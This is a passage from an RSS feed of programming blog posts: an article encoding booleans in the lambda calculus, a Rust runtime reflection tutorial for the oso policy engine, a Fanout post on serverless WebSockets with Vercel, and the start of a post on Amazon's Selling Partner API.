<p>Applications (‚Äúfunction application‚Äù and ‚Äúfunction call‚Äù will be used interchangeably) apply the result of the expression on the left to the expression on the right.</p>
<p>Applications are written as <code>x y</code>, for expressions x and y, and left-associated, i.e.&nbsp;<code>a b c</code> = <code>(a b) c</code> ‚â† <code>a (b c)</code>. Function application binds tighter than lambda abstraction, i.e.&nbsp;<code>Œª x . Œª y . y x</code> = <code>Œª x . Œª y . (y x)</code> ‚â† <code>Œª x . (Œª y . y) x</code>.</p>
<p>The syntax is the same in Haskell; in JavaScript, we would write <code>x(y)</code> or <code>a(b, c)</code>. Note however that since lambda calculus functions are all single-argument functions, a more direct (though less idiomatic) equivalent for the latter would be <code>a(b)(c)</code>.</p>
<h3 id="variables">Variables</h3>
<p>Variables introduced by enclosing lambdas.</p>
<p>Variable are written as more or less arbitrary names, typically alphanumeric (e.g.&nbsp;<code>x</code> or <code>y0</code> or <code>thing</code>); however, we will feel free to include non-alphanumeric characters in names as we see fit, since the paucity of syntax means there‚Äôs little risk of ambiguity.</p>
<p>Since the only available variables are those bound by enclosing lambdas, we can also infer that there are no <code>let</code> bindings for local variables, and no globals of any sort; the lambda calculus doesn‚Äôt come with a standard library.</p>
<h3 id="summary">Summary</h3>
<p>In quasi-BNF, the grammar for the lambda calculus is extremely minimal:</p>
<figure>
<p><em>e</em> <strong>:=</strong> <code>Œª</code> <em>x</em> <code>.</code> <em>e</em> <strong>|</strong> <em>e</em> <em>e</em> <strong>|</strong> <em>x</em> <strong>|</strong> (<em>e</em>)</p>
</figure>
<p>And finally, this table gives a side-by-side comparison of the syntax of the lambda calculus with the corresponding syntax in Haskell &amp; JavaScript:</p>
<table>
<caption>
Syntax of the lambda calculus, Haskell, &amp; JavaScript
</caption>
<thead>
<tr>
<th scope="col">
</th>
<th scope="col">
Lambda calculus
</th>
<th scope="col">
Haskell
</th>
<th scope="col">
JavaScript
</th>
</tr>
</thead>
<tbody>
<tr>
<th scope="row">
Abstraction
</th>
<td>
<code>Œª x . y</code>
</td>
<td>
<code>\ x -&gt; y</code>
</td>
<td>
<code>(x) =&gt; y</code>
</td>
</tr>
<tr>
<th scope="row">
Application
</th>
<td>
<code>f x</code>
</td>
<td>
<code>f x</code>
</td>
<td>
<code>f(x)</code>
</td>
</tr>
<tr>
<th scope="row">
Variable
</th>
<td>
<code>x</code>
</td>
<td>
<code>x</code>
</td>
<td>
<code>x</code>
</td>
</tr>
</tbody>
</table>

<h2 id="unconditional-Œª">Unconditional Œª</h2>
<p>Lambdas are the only way to introduce values‚Äîthey‚Äôre the only ‚Äúliteral‚Äù syntax in the language. We can therefore infer that the only kinds of runtime values must be closures. In an interpreter for the lambda calculus, closures might consist of the name of the introduced variable, the body of the lambda, &amp; a map relating the names and values of any variables it closed over when constructed (again, we assume strict lexical scoping). There are no bits, bytes, words, pointers, or objects in the language‚Äôs semantics; only this runtime representation of lambdas.</p>
<p>Likewise, lambdas are also the only way to introduce variables‚Äîthere‚Äôs no standard library, built-ins, primitives, prelude, or global environment to provide common definitions. We‚Äôre truly baking the apple pie from scratch.</p>
<p>All of this raises the question: how do you <em>do</em> anything when you don‚Äôt even have <code>true</code> and <code>false</code>? Lambdas and variables don‚Äôt <em>do</em>, they merely <em>are</em>, so that leaves application. When all you have is application, everything looks like a lambda abstraction, so we‚Äôll represent booleans using lambdas.</p>
<p>Of course, it‚Äôs not <em>just</em> booleans we‚Äôre after; <code>true</code> and <code>false</code> aren‚Äôt much use without <code>and</code>, <code>or</code>, <code>not</code>, <code>if</code>, and all the rest. To be useful, our representation of booleans should therefore suffice to define these, as well. But how do you define <code>if</code> without using <code>if</code>? In a lazy language like Haskell, we might define <code>if</code> as a function something like so:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>if_ ::</span> <span>Bool</span> <span>-&gt;</span> a <span>-&gt;</span> a <span>-&gt;</span> a</span>
<span id="cb1-2">if_ cond then_ else_ <span>=</span> <span>if</span> cond <span>then</span> then_ <span>else</span> else_</span></code></pre></div>
<p>In a strict language like JavaScript, we‚Äôd instead take functions for the alternatives:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>function</span> <span>if_</span>(cond<span>,</span> then_<span>,</span> else_) {</span>
<span id="cb2-2">  <span>if</span> (cond) {</span>
<span id="cb2-3">    <span>then_</span>()<span>;</span></span>
<span id="cb2-4">  } <span>else</span> {</span>
<span id="cb2-5">    <span>else_</span>()<span>;</span></span>
<span id="cb2-6">  }</span>
<span id="cb2-7">}</span></code></pre></div>
<p>Both these definitions use the language‚Äôs native booleans and <code>if</code> syntax (a tactic for implementing embedded DSLs known as ‚Äúmeta-circularity‚Äù), and thus aren‚Äôt viable in the lambda calculus. However, they do give us a hint: in both cases we have a function taking a condition, consequence, and alternative, and using the first to select one of the latter two. In the lambda calculus, we might start by writing:</p>
<pre><code>if = Œª cond then else . ?</code></pre>
<p>(Note: there aren‚Äôt any keywords in the lambda calculus, so there‚Äôs nothing stopping me from naming variables things like <code>if</code>, a fact which I will take free advantage of.)</p>
<p>We‚Äôve introduced a definition for <code>if</code>, as a function of three parameters; now what do we do with them? The lambda calculus‚Äôs stark palette makes it easy to enumerate <em>all</em> the things we can do with some variable <code>a</code>:</p>
<ol type="1">
<li><p>Ignore it, whether by simply not mentioning it at all (as in <code>Œª a . Œª b . b</code>), or by shadowing it with another lambda which binds the same name (as in <code>Œª a . Œª a . a</code>).</p></li>
<li><p>Mention it, whether on its own in the body of a lambda (as in <code>Œª a . a</code> or <code>Œª a . Œª b . a</code>), somewhere within either side of an application (as in <code>Œª a . Œª b . a b</code> or <code>Œª a . Œª b . b a</code>), or some combination of both (as in <code>Œª a . (Œª b . a) a</code>).</p></li>
</ol>
<p>We could for example simply return <code>then</code> or <code>else</code>:</p>
<pre><code>if = Œª cond then else . then
if = Œª cond then else . else</code></pre>
<p>But in that case the conditional isn‚Äôt conditional at all‚Äîthe value in no way depends on <code>cond</code>. Clearly the body must make use of all three variables if we want it to behave like the <code>if</code>s we know and love from other languages.</p>
<p>Taking a step back for a moment, let‚Äôs examine the roles of <code>if</code>‚Äôs arguments. <code>then</code> and <code>else</code> are passive; we only want to use or evaluate one or the other depending on the value of <code>cond</code>. <code>cond</code>, then, is the key: it takes the active role.</p>
<p>Thus, in the same way that our <code>if_</code> functions in Haskell &amp; JavaScript employed those language‚Äôs features to implement, we‚Äôre going to define <code>if cond then else</code> as the application of the condition to the other two parameters:</p>
<pre><code>if = Œª cond then else . cond then else</code></pre>

<p>This feels strangely like cheating: surely we‚Äôve only moved the problem around. Now instead of <code>if</code> making the decision about which argument to return, we‚Äôve deferred it to <code>cond</code>. But <code>if</code> and <code>cond</code> aren‚Äôt the same, semantically; <code>if</code> takes a boolean and two other arguments and returns one of the latter, while <code>cond</code> <em>is</em> a boolean‚Äîalbeit evidently a boolean represented as a function. Let‚Äôs make that precise by writing down <code>if</code>‚Äôs type:</p>
<pre><code>if : Bool -&gt; a -&gt; a -&gt; a</code></pre>
<p>Notwithstanding our use of the yet-to-be-defined name <code>Bool</code> for the type of the condition, this is the same type as we gave <code>if_</code> in Haskell; that‚Äôs a good sign that we‚Äôre on the right track! It takes a <code>Bool</code> and two arguments of type <code>a</code>, and it must return one of those because that‚Äôs the only way for it to come up with the <code>a</code> that it returns. But what <em>is</em> <code>Bool</code>?</p>
<p>Working backwards from the type and definition of <code>if</code>, we see that <code>cond</code> is applied to two arguments, and therefore must be a function of two parameters. Further, these are both of type <code>a</code>, and the value it returns must also be of type <code>a</code> for <code>if</code>‚Äôs type to hold. Thus, we can define the type <code>Bool</code> like so:</p>
<pre><code>Bool = ‚àÄ a . a -&gt; a -&gt; a</code></pre>

<p>If a given <code>Bool</code> is a function of two arguments of arbitrary type, returning the same type, it must therefore select one of its arguments to return. There are only two distinguishable inhabitants of <code>Bool</code>, <code>true</code> and <code>false</code>, so we can therefore deduce that since <code>if</code> defers the selection of the result to the <code>Bool</code>, for <code>true</code> and <code>false</code> to actually differ they must make opposite selections. In other words, <code>true</code> must return the <code>then</code> parameter, while <code>false</code> must return the <code>else</code> one:</p>
<pre><code>true, false : Bool
true  = Œª then else . then
false = Œª then else . else</code></pre>
<p>We didn‚Äôt move the problem around after all; we solved it. What we noticed was a deeper insight: this encoding of booleans makes <code>if</code> redundant, since if we can apply <code>if</code> to a <code>Bool</code> and two arguments, we could equally apply the <code>Bool</code> to those arguments directly.</p>

<p>It‚Äôs frequently convenient to conflate booleans with bits, their minimal representation, but in truth they‚Äôre not the same at all. Practically, some programming languages define booleans as a byte in memory, perhaps clamping its values to 0 and 1; others define them as instances of some boolean class, or constructors of an algebraic datatype. Some provide no formal relationship between <code>true</code> and <code>false</code> at all, save for a common interface‚Äîduck typing.</p>
<p>Mathematically, booleans are the values in propositional logic; the upper and lower bounds of a lattice; the zero and one of a semiring; the members of the set with cardinality 2; ‚Ä¶</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/">https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/</a></em></p>]]>
            </description>
            <link>https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580312</guid>
            <pubDate>Thu, 24 Sep 2020 16:26:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a runtime reflection system for Rust (Part 1)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580273">thread link</a>) | @samjs
<br/>
September 24, 2020 | https://www.osohq.com/post/rust-reflection-pt-1 | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/rust-reflection-pt-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>Part 1: <code>dyn Class</code></h2>
<h3>Introduction</h3>
<p>We're building oso, an open source policy engine for authorization. You can use oso to separate authorization logic from application code by writing policies in our declarative language, called Polar. oso is built to be <em>embedded</em> directly in the application, which means you can pass in application objects, check types, lookup attributes, and call methods. To do this, it relies on each host language's support for runtime reflection.</p>
<p>This is trivial for languages like Python, for instance, where getting the type from an object is as simple as <code>type(obj)</code>, and accessing arbitrary attributes and methods is just <code>getattr(obj, "attr")</code>. We first shipped oso with support for Python, Ruby and Java, followed by JavaScript.</p>
<p>When we set out to build support for oso in Rust applications, we had to solve this problem ourselves because Rust doesn't have any out-of-the box support for runtime reflection. It does, however, have some low-level building blocks that we can assemble to create something similar.</p>
<p>This is the first part of a three-part series in which we describe how we implemented a runtime reflection system in Rust for oso.</p>
<p>In this post, we look at how dynamic type checks work in Rust, and explain how our team built a simple class system that we use as the foundation for the rest of the reflection system and the rest of the series.</p>
<h3>Introduction to <code>std::any::Any</code></h3>
<p>The main way to achieve dynamic dispatch in Rust is through the trait system. And the <a href="https://doc.rust-lang.org/book/ch17-03-oo-design-patterns.html#summary">Rust book has this quote</a> for us in design patterns:</p>
<blockquote>
<p>No matter whether or not you think Rust is an object-oriented language after reading this chapter, you now know that you can use trait objects to get some object-oriented features in Rust. Dynamic dispatch can give your code some flexibility in exchange for a bit of runtime performance</p>
</blockquote>
<p>In some ways, the Mother of all Traits is <a href="https://doc.rust-lang.org/std/any/trait.Any.html"><em>std::any::Any</em></a>, which the documentation describes as "A trait to emulate dynamic typing."</p>
<p>This lets us erase a thing's concrete type, and pass around its "trait object" instead:</p>
<pre><code>let s: String = "Hello, World".to_string();
let any: Box&lt;dyn Any&gt; = Box::new(s);

// `any` doesn't have a type, running:
//    println!("{}", any);
// would fail with:
//     error[E0277]: `dyn std::any::Any` doesn't implement `std::fmt::Display`

let mut recovered: Box&lt;String&gt; = any.downcast().expect("failed conversion");
recovered.make_ascii_uppercase();
println!("{}", recovered);
</code></pre>

<p>In case you're interested: profiling the bottom code takes 18ns versus approx. 16ns for the version without downcasting. You can see in the assembly there's some 20-30 instructions needed for the conversion: <a href="https://godbolt.org/z/Ph6q3b">https://godbolt.org/z/Ph6q3b</a>.</p>
<p>A few layers beneath the surface of the <code>Any</code> trait, and what makes the above possible, is <a href="https://doc.rust-lang.org/std/any/struct.TypeId.html#method.of"><code>TypeId::of::&lt;T&gt;</code></a>. This method uses a compiler intrinsic to inspect the object's type. The important part is that the original object still has a concrete type, even though that type has temporarily been "lost" to the current scope.</p>
<p>With this one small piece of intrinsic Rust, we begin to build our fully dynamic system.</p>
<h2>What is oso?</h2>
<p>As mentioned at the beginning, oso is a policy engine for authorization. It reads in policies ‚Äì written in the Polar language ‚Äì and makes authorization decisions by evaluating the rules against the provided inputs. Polar is a variant of Prolog, and encodes logic as rules. The syntax looks like this:</p>
<pre><code># True for all inputs that are of type Foo
is_a_foo(input: Foo);

# True if the x attribute of the input is equal to 1
x_is_one(input) if input.x = 1;
</code></pre>

<p>The important parts are (a) <code>input: Foo</code> which checks that the input parameter is of type <code>Foo</code>, and where <code>Foo</code> is a type defined in the application; and (b) <code>input.x</code> which is a lookup on <code>input</code> of the attribute <code>x</code> , even if <code>input</code> is an application object. These are the types of use cases that our dynamic system needs to support.</p>
<h3>Implementing <code>Class</code> and <code>Instance</code></h3>
<p>We lay the foundation of our runtime reflection system by wrapping types up in classes, and wrapping objects as instances. Starting with just the pieces we've seen so far, the initial implementations for these look like this:</p>
<pre><code>/// Class definition
struct Class {
   /// The name of the class
   name: String,
   /// The corresponding Rust type
   type_id: TypeId,
}

impl Class {
    /// Create a new class definition for the type `T`
    fn new&lt;T&gt;() -&gt; Self {
        Self {
            name: std::any::type_name::&lt;T&gt;(),
            type_id: TypeId::of::&lt;T&gt;(),
        }
    }
}

/// An instance of a class
struct Instance {
    inner: Arc&lt;dyn Any&gt;, // `Arc` because we don't need/want mutability
}

impl Instance {
    /// Construct a new `Instance` from a type that
    /// implements `Any` (i.e. any sized type).
    fn new(obj: impl Any) -&gt; Self {
        Self {
            inner: Arc::new(obj)
        }
    }
}
</code></pre>

<p>With just this in place, we have our simple runtime class system!</p>
<h3>Dynamic type checking</h3>
<p>As shown in the brief snippet of Polar earlier, we want to be able to type-check using the syntax <code>input: Foo</code>. This translates into our class system as: "is <code>input</code> an instance of the <code>Foo</code> class"?</p>
<p>We could track what type the object had when we created it by storing the <code>TypeId</code>, but it's actually even simpler to recover the <code>TypeId</code> of the inner object stored on our <code>Instance</code> using the <code>Any::type_id</code> trait method:</p>
<pre><code>impl Instance {
    /// Check whether this is an instance of the provided class
    fn instance_of(&amp;self, class: &amp;Class) -&gt; bool {
        self.inner.as_ref().type_id() == class.type_id
    }
}
</code></pre>

<p>Not bad!</p>
<p>Note one important detail: when writing this example I initially wrote <code>self.inner.type_id() == class.type_id</code> . This <a href="https://play.rust-lang.org/?version=nightly&amp;mode=debug&amp;edition=2018&amp;gist=51ca79b94b834e0696cd619b7c51634c">is not the same thing</a> as the code above, because <code>Arc&lt;dyn Any&gt;</code> <em>also</em> implements <code>std::any::Any</code>, and thus has a type ID. To avoid making these kinds of mistakes, we've found that the best practice is to restrict the number of places directly accessing the <code>dyn Any</code> object to as few as possible, providing helper functions for even the simplest of methods.</p>
<p>To test that this is working:</p>
<pre><code>#[test]
fn test_instance_of() {
    struct Foo {}
    struct Bar {}

    let foo_class: Class = Class::new::&lt;Foo&gt;();
    let bar_class: Class = Class::new::&lt;Bar&gt;();
    let foo_instance: Instance = Instance::new(Foo {});

    assert!(foo_instance.instance_of(&amp;foo_class));
    assert!(!foo_instance.instance_of(&amp;bar_class));
}
</code></pre>

<p>And there we have it ‚Äì&nbsp;we were able to successfully determine <strong>at runtime</strong> the class of the <code>Instance</code>!</p>
<h3>Future extension: traits as interfaces</h3>
<p>Now that we have our class system up and running, what else can we do with it? One pattern used in oso policies is using inheritance to write rules over multiple objects. For example, we might model "vets can treat all pets," as <code>can_treat("vet", pet: Pet)</code>, but "only doctors can treat a human" as <code>can_treat("doctor", human: Human)</code>.</p>
<p>Rust doesn't <em>really</em> have any notion of subtypes (except for lifetimes, which are out of scope for this post) but it does have traits. And traits are like interfaces. So perhaps we should be able to use traits again in some way?</p>
<p>Revisiting the docs for <code>std::any::Any</code> we find:</p>
<blockquote>
<p>Note that &amp;dyn Any is limited to testing whether a value is of a specified concrete type, and cannot be used to test whether a type implements a trait.</p>
</blockquote>
<p>Well, then.</p>
<p>Not all hope is lost, there are some interesting approaches out there to do <em>just what we need</em>. The most prominent approach I could find is <a href="https://github.com/Diggsey/query_interface"><code>query_interface</code></a>. Or <a href="http://idubrov.name/rust/2018/06/16/dynamic-casting-traits.html">this blog post</a> on dynamic casting for traits.</p>
<p>Digging into how <code>query_interface</code> works: there's a fair amount of unsafety and casting pointers and vtable manipulation. All fun stuff, but the disappointing part (for us) is that the "check whether a type implements a trait" is really handled at compile-time by the macro. There are lines like:</p>
<pre><code>let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
</code></pre>

<p>Which will error at compile-time if <code>Foo</code> doesn't implement <code>MyTrait</code>:</p>
<pre><code>138 |     let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^ the trait `MyTrait` is not implemented for `Foo`
</code></pre>

<p>It's doing the wildly unsafe casting-trait-objects-to-other-trait-objects-at-runtime, but the checks are all done at compile-time. And the trait bounds are explicitly "registered" through use of the macro: <code>interfaces!(Foo: dyn MyTrait)</code>.</p>
<p>Given that we're not <em>yet</em> interested in using trait implementations, rather just checking whether a type implements a trait or not, this approach doesn't help us get any closer to making our runtime reflection system support traits as interfaces.</p>
<p>If instead we scope the task to registering trait implementations as part of a macro, we can get there with something more straightforward:</p>
<pre><code>trait HasInterface {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool;
}

impl HasInterface for Foo {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool
    {
        // compile-time assertions
        static_assertions::assert_impl_all!(Foo: MyTrait);

        // runtime check
        match std::any::TypeId::of::&lt;T&gt;() {
            x if x == std::any::TypeId::of::&lt;dyn MyTrait&gt;() =&gt; true,
              // ... etc
              _ =&gt; false,
        }
    }
}
</code></pre>

<p>The above code is safe, and can easily be automated through a macro. However, it does have the same limitation as <code>query_interface</code> ‚Äì&nbsp;the traits need to be <a href="https://doc.rust-lang.org/1.26.2/book/second-edition/ch17-02-trait-objects.html#object-safety-is-required-for-trait-objects"><em>object safe</em></a>.</p>
<h3>Conclusion</h3>
<p>We've built the foundation of our runtime reflection system through classes and instances, and we've shown some simple dynamic type checking using the built in <code>Any</code> trait.</p>
<p>Up next, things start getting a bit more complicated as we attempt to replicate Python's <code>getattr</code> magic method, and make it possible to look up <em>attributes</em> on Rust structs dynamically at runtime.</p>
<ul>
<li>Subscribe to our newsletter below to get the next installment of this
  series.</li>
<li>Interested in learning more about oso? Check out our
  <a href="https://docs.osohq.com/">docs</a>.</li>
<li>If you have any feedback, or want to chat about Rust, come join us in
  <a href="https://join-slack.osohq.com/">Slack</a>.</li>
</ul></div></div></div>]]>
            </description>
            <link>https://www.osohq.com/post/rust-reflection-pt-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580273</guid>
            <pubDate>Thu, 24 Sep 2020 16:23:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vercel and WebSockets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580260">thread link</a>) | @jkarneges
<br/>
September 24, 2020 | https://blog.fanout.io/2020/09/21/vercel-and-websockets/ | <a href="https://web.archive.org/web/*/https://blog.fanout.io/2020/09/21/vercel-and-websockets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  <!-- Embellishments -->
  
  

  

  <!-- Page content -->
  <section>
    <article>
      <p><a href="https://vercel.com/">Vercel</a> makes it easy to deploy and scale HTTP APIs using <a href="https://vercel.com/docs/serverless-functions/introduction">Serverless Functions</a>. However, it‚Äôs not possible to use serverless functions to host WebSocket APIs. Does this mean you need to give up on your hopes and dreams and set up normal servers to handle your WebSockets? No way! Vercel can be combined with <a href="https://fanout.io/cloud/">Fanout Cloud</a> to handle WebSocket connections without having to literally host them.</p>

<p><img src="https://blog.fanout.io/assets/fanout-vercel.png" alt="fanout-vercel"></p>

<p>By using Vercel and Fanout Cloud together, API logic can be kept in one place. Fanout Cloud can manage the WebSocket connections, and invoke functions whenever there is client activity. What‚Äôs great about this approach is there‚Äôs nothing extra to deploy, and it works at high scale too.</p>

<!--more-->

<h3 id="example">Example</h3>

<p>Below is some code for a simple WebSocket chat API. Messages received from clients are broadcasted to all other connected clients. It uses the <a href="https://github.com/fanout/js-serve-grip">serve-grip</a> library, which provides a pseudo-WebSocket connection object. ‚ÄúGRIP‚Äù is the name of the integration protocol Fanout uses with the backend server.</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>ServeGrip</span> <span>}</span> <span>=</span> <span>require</span><span>(</span> <span>'</span><span>@fanoutio/serve-grip</span><span>'</span> <span>);</span>
<span>const</span> <span>{</span> <span>WebSocketMessageFormat</span> <span>}</span> <span>=</span> <span>require</span><span>(</span> <span>'</span><span>@fanoutio/grip</span><span>'</span> <span>);</span>

<span>const</span> <span>serveGrip</span> <span>=</span> <span>new</span> <span>ServeGrip</span><span>({</span><span>grip</span><span>:</span> <span>process</span><span>.</span><span>env</span><span>.</span><span>GRIP_URL</span><span>});</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>async</span> <span>(</span><span>req</span><span>,</span> <span>res</span><span>)</span> <span>=&gt;</span> <span>{</span>

    <span>await</span> <span>serveGrip</span><span>.</span><span>run</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>);</span>

    <span>const</span> <span>{</span> <span>wsContext</span> <span>}</span> <span>=</span> <span>req</span><span>.</span><span>grip</span><span>;</span>
    <span>if</span> <span>(</span><span>wsContext</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
        <span>res</span><span>.</span><span>statusCode</span> <span>=</span> <span>400</span><span>;</span>
        <span>res</span><span>.</span><span>end</span><span>(</span><span>'</span><span>Not a WebSocket-over-HTTP request</span><span>\n</span><span>'</span><span>);</span>
        <span>return</span><span>;</span>
    <span>}</span>

    <span>// if this is a new connection, accept it and subscribe it to a channel</span>
    <span>if</span> <span>(</span><span>wsContext</span><span>.</span><span>isOpening</span><span>())</span> <span>{</span>
        <span>wsContext</span><span>.</span><span>accept</span><span>();</span>
        <span>wsContext</span><span>.</span><span>subscribe</span><span>(</span><span>'</span><span>all</span><span>'</span><span>);</span>
    <span>}</span>

    <span>while</span> <span>(</span><span>wsContext</span><span>.</span><span>canRecv</span><span>())</span> <span>{</span>
        <span>const</span> <span>message</span> <span>=</span> <span>wsContext</span><span>.</span><span>recv</span><span>();</span>

        <span>if</span> <span>(</span><span>message</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
            <span>// if return value is undefined then connection is closed</span>
            <span>wsContext</span><span>.</span><span>close</span><span>();</span>
            <span>break</span><span>;</span>
        <span>}</span>

        <span>// broadcast to other connections</span>
        <span>const</span> <span>publisher</span> <span>=</span> <span>serveGrip</span><span>.</span><span>getPublisher</span><span>();</span>
        <span>await</span> <span>publisher</span><span>.</span><span>publishFormats</span><span>(</span>
            <span>'</span><span>all</span><span>'</span><span>,</span>
            <span>new</span> <span>WebSocketMessageFormat</span><span>(</span><span>message</span><span>)</span>
        <span>);</span>
    <span>}</span>

    <span>res</span><span>.</span><span>end</span><span>();</span>
<span>};</span>
</code></pre></div></div>

<p>For demonstration purposes, the above code has been deployed and set up as follows:</p>

<ul>
  <li>The code has been deployed to Vercel with base URL <code>https://vercel-websocket.vercel.app</code>.</li>
  <li>The Fanout domain <code>bce4b2a0.fanoutcdn.com</code> has been set up with <code>vercel-websocket.vercel.app:443</code> as its origin server.</li>
  <li>The <code>GRIP_URL</code> environment variable has been set on the Vercel app, containing Fanout credentials.</li>
</ul>

<p>It is possible to connect with a WebSocket client and send a message:</p>

<div><div><pre><code>$ wscat -c wss://bce4b2a0.fanoutcdn.com/api/chat
connected (press CTRL+C to quit)
&gt; hi
&lt; hi
</code></pre></div></div>

<h3 id="how-it-works">How it works</h3>

<p>Fanout Cloud acts as a proxy between clients and an origin server, with some important abilities:</p>

<ul>
  <li>WebSocket client traffic is converted into a series of HTTP requests sent to the origin server. This makes it possible for a plain HTTP backend to react to WebSocket traffic.</li>
  <li>The origin server can associate publish-subscribe channels with client connections, and then publish raw WebSocket messages to be injected into those client connections.</li>
</ul>

<p>The <a href="https://github.com/fanout/js-serve-grip">serve-grip</a> library provides a socket-like object called <code>WebSocketContext</code> that handles the event marshalling over HTTP. The object contains methods like <code>accept()</code>, <code>send()</code>, <code>recv()</code>, etc. What‚Äôs interesting is that these methods don‚Äôt operate directly on a real WebSocket. When <code>recv()</code> is called, it simply iterates over the events received in the current HTTP request. When <code>send()</code> is called, events are temporarily enqueued and a middleware serializes them at the end into the HTTP response. <code>WebSocketContext</code> objects are not long-lived, and a fresh one is created for each handler invocation and destroyed afterwards.</p>

<p>The library also provides ways to subscribe connections to channels as well as to publish to channels. Notably, clients have no awareness of GRIP or channels. They just connect to WebSocket URLs and exchange arbitrary messages, the meaning of which is determined by your application.</p>

<p>For protocol details, see <a href="https://pushpin.org/docs/protocols/grip/">Generic Realtime Intermediary Protocol</a> and <a href="https://pushpin.org/docs/protocols/websocket-over-http/">WebSocket-over-HTTP</a>.</p>

<h3 id="serverless-websockets-today">Serverless WebSockets, today</h3>

<p>Sign up for a free <a href="https://fanout.io/cloud/">Fanout Cloud</a> account and get a WebSocket API up and running in no time.</p>


    </article>

    <!-- <p class="subtome">
      <span class="subtome-description">Liked this post? Follow this blog to get more.</span>&nbsp;<input type="button" onclick="(function(){var z=document.createElement('script');z.src='https://www.subtome.com/load.js';document.body.appendChild(z);})()" value="Follow" />
    </p> -->

  </section>

  <section>
    <h2>Recent posts</h2>

    
    <h2>
      <a href="https://blog.fanout.io/">View all posts</a>
    </h2>
  </section>


</div>

<!-- <div class="post">

  <header class="post-header">
    <h1 class="post-title">Vercel and WebSockets</h1>
    <p class="post-meta">Sep 21, 2020 ‚Ä¢ justin</p>
  </header>

  <article class="post-content">
  </article>

</div> -->

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.fanout.io/2020/09/21/vercel-and-websockets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580260</guid>
            <pubDate>Thu, 24 Sep 2020 16:23:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Successor to Amazon MWS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580022">thread link</a>) | @jlevers
<br/>
September 24, 2020 | https://jesseevers.com/new-amazon-seller-api/ | <a href="https://web.archive.org/web/*/https://jesseevers.com/new-amazon-seller-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
        </header>
      

      <section itemprop="text">
        
        <p>‚Ä¶well, sort of. In a few days, Amazon is releasing a new marketplace API that sellers can use to programmatically control their seller accounts. It‚Äôs called the Selling Partner API, or SP for short. SP is a major upgrade from MWS‚Äîlet‚Äôs look at how the two services are different, and why you should care.</p>
<p>For 10+ years, <a href="http://docs.developer.amazonservices.com/en_US/dev_guide/index.html">Amazon's Marketplace Web Services</a> (MWS) has been the only option for interfacing with Amazon seller accounts programatically. You can control everything about your Amazon store via MWS, from managing inventory to receiving order information to handling fulfillment. It‚Äôs a powerful tool, because it enables sellers to handle larger inventories and order volume, automatically modify prices to stay competitive, and do other common (and not so common) operations in bulk.</p>
<p>MWS has some warts, though. It‚Äôs an XML-based API, a design that largely fell by the wayside as JSON-based APIs became increasingly popular in the last decade.<sup><a id="fnr.1" href="#fn.1">1</a></sup> XML imposes more mandatory structure on each API request than JSON does, leading to extra layers of abstraction on top of HTTP. It also has static, non-adjustable rate limits, and error handling is cumbersome‚Äîwhen you send a data file to MWS, you have to wait for it to finish processing, and then pull down another file that maps errors to specific lines in the file you uploaded.</p>
<p>SP solves all these problems, and more! Some of my favorite features:</p>
<ul>
  <li><b>A RESTful interface, operated via standard HTTP methods.</b> All MWS requests are done via POST, and the actual operation performed is dictated by the content of the request. In contrast, SP requests use the GET, POST, or PUT methods, all of which cause the action related to the verb.<sup><a id="fnr.2" href="#fn.2">2</a></sup></li>
  <li><b><a href="https://github.com/amzn/selling-partner-api-docs/blob/main/guides/usage-plans-rate-limits/Usage-Plans-and-Rate-Limits.md">Dynamic usage plans.</a></b> Now you can increase rate limits as your business grows, so you don‚Äôt have to pick and choose which API operations to perform to stay below a static limit.</li>
  <li><b>Better handling for authentication and permissions.</b> You can specify granular permissions, and API tokens are available via AWS IAM<sup><a id="fnr.3" href="#fn.3">3</a></sup> rather than a complex registration process.</li>
  <li><b>A sandboxed version of the API.</b> MWS doesn‚Äôt have one of these, so you have to test your code on production data. It‚Äôs a nerve wracking experience‚ÄïI will definitely admit to having messed up data as a result of this.</li>
</ul>
<p>If you‚Äôre a seller or developer with an MWS application, don‚Äôt panic! Amazon isn‚Äôt planning to immediately deprecate MWS. You can incrementally transition your application from MWS to SP, since there will be support for <a href="https://github.com/amzn/selling-partner-api-docs/blob/main/guides/developer-guide/SellingPartnerApiDeveloperGuide.md#creating-a-hybrid-selling-partner-api-application">hybrid Selling Partner applications</a> that use both MWS and SP at the same time. That said, Amazon does say that ‚Äúthe legacy Amazon MWS APIs will be deprecated in the future,‚Äù so I recommend getting ahead of the issue.</p>
